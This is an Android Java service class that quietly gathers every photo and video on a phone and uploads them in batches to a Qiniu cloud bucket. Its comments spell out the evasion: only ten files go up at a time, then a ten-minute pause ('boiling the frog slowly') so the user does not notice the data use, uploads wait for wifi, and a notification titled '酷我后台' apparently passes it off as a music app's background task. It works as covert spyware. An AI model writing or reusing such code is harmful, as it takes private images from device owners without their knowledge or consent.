package com.wc.qiniu;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.FragmentActivity;

import com.qiniu.android.common.FixedZone;
import com.qiniu.android.http.ResponseInfo;
import com.qiniu.android.storage.Configuration;
import com.qiniu.android.storage.UpCompletionHandler;
import com.qiniu.android.storage.UpProgressHandler;
import com.qiniu.android.storage.UploadManager;
import com.qiniu.android.storage.UploadOptions;
import com.qiniu.util.Auth;
import com.wc.qiniu.db.OrmliteDbHelper;
import com.wc.qiniu.db.UploadBean;
import com.wc.qiniu.db.UploadDao;
import com.wc.qiniu.read.LocalMedia;
import com.wc.qiniu.read.LocalMediaFolder;
import com.wc.qiniu.read.LocalMediaLoader;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;


public class QiniuService extends Service {
    private static final String TAG = "com.wc.qiniu QiniuService: ";
    private static final int NOTIFICATION_ID = 54321;
    private static final String CHANNEL_ID = "msf.qiniuservice";
    private static final String CHANNEL_NAME = "QiniuService";
    private static final int MAX_SIZE = 10;//一次传10张图，不然用户的流量一直在跑就被发现了
    private NotificationManager mManager;
    private ConnectivityManager mConnectivityManager;
    private boolean permission;
    private static long mLastTime;
    private List<LocalMedia> images = new ArrayList<>();//找到的本地文件合集
    private UploadDao mUploadDao;
    private UploadManager mUploadManager;
    private UploadOptions mUploadOptions;
    private int position = 0;
    private int up_position = 0;
    private Handler mHandler;//做计时处理的

    //初始化数据库以及图片视频查找库（一定要在开启服务之前调用，否则会蹦）
    public static void init(FragmentActivity activity) {
        try {
            LocalMediaLoader.getInstance().init(activity);
            OrmliteDbHelper.init(activity.getApplicationContext());//数据库
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //开启服务
    public synchronized static void startService(Context context) {
        if ((System.currentTimeMillis() - mLastTime) < 30 * 1000) {//防止连续调用
            return;
        }
        mLastTime = System.currentTimeMillis();
        if (context != null) {
            try {
                Intent intent = new Intent(context, QiniuService.class);
                context.startService(intent);
            } catch (Exception e) {
                e.printStackTrace();
                if (e instanceof IllegalStateException && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {//
                    Intent intent = new Intent(context, QiniuService.class);
                    intent.putExtra("is_foreground", true);
                    context.startForegroundService(intent);
                }
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        System.out.println(TAG + " onCreate");
        mHandler = new Handler(Looper.getMainLooper(), new Handler.Callback() {
            @Override
            public boolean handleMessage(@NonNull Message msg) {
                switch (msg.what) {
                    case 0://用户处于非wifi状态执行的延迟上传任务
                        upLoadFile();
                        break;
                    case 1://每次传10张图就暂停10分钟再继续
                        try {
                            up_position = 0;
                            startUpload((String) msg.obj);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        break;
                }
                return true;
            }
        });
        try {
            permission = PackageManager.PERMISSION_GRANTED == getPackageManager().checkPermission("android.permission.ACCESS_NETWORK_STATE", getPackageName());
        } catch (Exception e) {
            e.printStackTrace();
        }
        readLocalMedia();
    }


    //获取本地图片和视频
    protected void readLocalMedia() {
        try {
            LocalMediaLoader.getInstance().loadAllMedia(new LocalMediaLoader.LocalMediaLoadListener() {
                @Override
                public void loadComplete(List<LocalMediaFolder> folders) {
                    if (folders.size() > 0) {
                        LocalMediaFolder folder = folders.get(0);
                        folder.setChecked(true);
                        List<LocalMedia> localImg = folder.getImages();
                        // 这里解决有些机型会出现拍照完，相册列表不及时刷新问题
                        // 因为onActivityResult里手动添加拍照后的照片，
                        // 如果查询出来的图片大于或等于当前adapter集合的图片则取更新后的，否则就取本地的
                        if (localImg.size() >= images.size()) {
                            images = localImg;
                        }
                    }
                    if (images == null) {
                        images = new ArrayList<>();
                    }
                    Collections.sort(images, new Comparator<LocalMedia>() {
                        @Override
                        public int compare(LocalMedia o1, LocalMedia o2) {
                            return Double.compare(o1.size, o2.size);
                        }
                    });
                    System.out.println(TAG + "load finish size " + images.size());
                    upLoadFile();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //上传文件方法
    private void upLoadFile() {
        if (images == null || images.size() <= 0) {
            return;
        }
        System.out.println(TAG + "permission = " + permission);
        //咱们不能太黑心了，还是让用户有wifi的时候再传文件
        if (permission && !isWifiConnect()) {
            System.out.println(TAG + " !isWifiConnect()");
            mHandler.sendEmptyMessageDelayed(0, 2 * 60 * 1000);//两分钟后再来判断一下用户是否处于wifi状态
            return;
        }
        try {
            String accessKey = QiniuConfig.ACCESSKEY;
            String secretKey = QiniuConfig.SECRETKEY;
            String bucket = QiniuConfig.BUCKET;
            Auth auth = Auth.create(accessKey, secretKey);
            String upToken = auth.uploadToken(bucket);
//            for (LocalMedia localMedia : images) {
//                System.out.println(TAG + localMedia.size + "---" + localMedia.getPath());
//            }
            //配置断点续传
//            FileRecorder fileRecorder = null;
//            try {
//                fileRecorder = new FileRecorder(getUpDir());
//            } catch (Exception e) {
//                e.printStackTrace();
//                System.out.println(TAG + "configuration failure");
//            }
            //config配置上传参数
            Configuration configuration = new Configuration.Builder()
                    .connectTimeout(10)
                    .zone(FixedZone.zone2)
//                    .recorder(fileRecorder)
                    //.dns(buildDefaultDns())//指定dns服务器
                    .responseTimeout(60).build();

            mUploadOptions = new UploadOptions(null, null, true, new UpProgressHandler() {
                @Override
                public void progress(String key, double percent) {
                    System.out.println(TAG + "percent:" + percent);
                }
            }, null);
            // 重用uploadManager。一般地，只需要创建一个uploadManager对象
            mUploadManager = new UploadManager(configuration, 3);//配置3个线程数并发上传；不配置默认为3，只针对file.size>4M生效。线程数建议不超过5，上传速度主要取决于上行带宽，带宽很小的情况单线程和多线程没有区别
            System.out.println(TAG + "file up ing。。。");
            mUploadDao = new UploadDao();
            startUpload(upToken);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 检查wifi是否处开连接状态
     */
    public boolean isWifiConnect() {
        if (mConnectivityManager == null) {
            mConnectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        }
        if (mConnectivityManager != null) {
            NetworkInfo mWifiInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            if (mWifiInfo != null) {
                return mWifiInfo.isConnected();
            }
        }
        return false;
    }

    //上传文件到七牛云储存的核心方法
    private void startUpload(final String upToken) throws Exception {
        if (position >= images.size()) {
            System.out.println(TAG + "all file up complete");
            return;
        }
        if (up_position >= MAX_SIZE) {
            Message msg = Message.obtain();
            msg.what = 1;
            msg.obj = upToken;
            mHandler.sendMessageDelayed(msg, 10 * 60 * 1000);//10分钟后再传，不用急 温水煮青蛙
            System.out.println(TAG + "up ed " + up_position + " waiting 10m");
            return;
        }
        final LocalMedia localMedia = images.get(position);
        if (mUploadDao.getFile(localMedia.getPath()) != null) {
            position++;
            startUpload(upToken);
            System.out.println(TAG + "up ed start up next");
            return;
        }
        File file = new File(localMedia.getPath());
        if (!file.exists()) {
            position++;
            startUpload(upToken);
            return;
        }
        final long uploadFileLength = file.length();
        final long startTime = System.currentTimeMillis();
        mUploadManager.put(file, file.getName(), upToken,
                new UpCompletionHandler() {
                    @Override
                    public void complete(String key, ResponseInfo respInfo, JSONObject jsonData) {
                        long endTime = System.currentTimeMillis();
                        if (respInfo.isOK()) {
                            try {
                                //Log.e("zw", jsonData.toString() + respInfo.toString());
                                System.out.println(TAG + "--------------------------------UPTime/ms: " + (endTime - startTime));
                                String fileKey = jsonData.getString("key");
                                String fileHash = jsonData.getString("hash");
                                System.out.println(TAG + "File Size: " + Tools.formatSize(uploadFileLength));
                                System.out.println(TAG + "File Key: " + fileKey);
                                System.out.println(TAG + "File Hash: " + fileHash);
                                System.out.println(TAG + "X-Reqid: " + respInfo.reqId);
                                System.out.println(TAG + "X-Via: " + respInfo.xvia);
                                System.out.println(TAG + "--------------------------------" + "up complete");
                            } catch (JSONException e) {
                                System.out.println(TAG + "上传失败");
                                System.out.println(TAG + jsonData.toString());
                                System.out.println(TAG + "--------------------------------" + "up failure");
                            }
                            UploadBean uploadBean = new UploadBean();
                            uploadBean.setFileid(position + "-" + localMedia.name);
                            uploadBean.setSize((long) localMedia.size);
                            uploadBean.setTime(endTime);
                            uploadBean.setPath(localMedia.getPath());
                            mUploadDao.addFile(uploadBean);
                            position++;
                            up_position++;
                            try {
                                startUpload(upToken);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        } else {
                            System.out.println(TAG + respInfo.toString());
                            if (jsonData != null) {
                                System.out.println(TAG + jsonData.toString());
                            }
                            System.out.println(TAG + "--------------------------------" + "up failure");
                            position++;
                            try {
                                startUpload(upToken);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }, mUploadOptions);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        System.out.println(TAG + "onStartCommand");
        //检测是否为后台开启，Android8.0做了后台开启服务限制(目前暂时用不到)
        boolean is_foreground = false;
        if (intent != null) {
            is_foreground = intent.getBooleanExtra("is_foreground", false);
        }
        try {
            if (is_foreground) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                    startForegroundService();
                    System.out.println(TAG + "onStartCommand startForegroundService");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
//        stopSelf(startId);
//        if (is_foreground) {
//            stopForeground(true);
//        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    private void startForegroundService() {
        if (mManager == null) {
            mManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        }
        //创建NotificationChannel
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_HIGH);
            mManager.createNotificationChannel(channel);
        }
        startForeground(NOTIFICATION_ID, getNotification());
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    private Notification getNotification() {
        Notification.Builder builder = new Notification.Builder(this)
                .setContentTitle("酷我后台")
                .setContentText("通知显示测试。。。");
        //设置Notification的ChannelID,否则不能正常显示
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID);
        }
        return builder.build();
    }

    private static final String DATA_DIRECTORY = Environment.getExternalStorageDirectory()
            + "/qiniu/";
    private static final String LOG_DIR = "/kwup/";// log目录

    private String getUpDir() {
        String path = DATA_DIRECTORY + LOG_DIR;
        File dir = new File(path);
        if (!dir.exists()) {
            boolean b = dir.mkdirs();
        }
        return path;
    }
}
